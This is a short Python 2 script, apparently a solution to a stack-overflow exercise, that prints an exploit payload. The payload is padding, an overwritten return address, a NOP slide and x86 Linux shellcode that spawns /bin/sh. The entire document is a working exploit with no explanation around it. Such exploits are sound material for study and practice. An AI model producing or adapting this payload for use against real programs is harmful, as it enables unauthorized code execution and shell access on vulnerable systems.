import struct

padding = "aaaabbbbccccddddeeeeffff"
ret = struct.pack("I", 0xbffff74c + 0x100)
nop_slide = "\x90" * 0x200
shellcode = (
	"\x31\xc0\x50\x68\x2f\x2f\x73"
	"\x68\x68\x2f\x62\x69\x6e\x89"
	"\xe3\x89\xc1\x89\xc2\xb0\x0b"
	"\xcd\x80\x31\xc0\x40\xcd\x80"
)

print padding + ret + nop_slide + shellcode
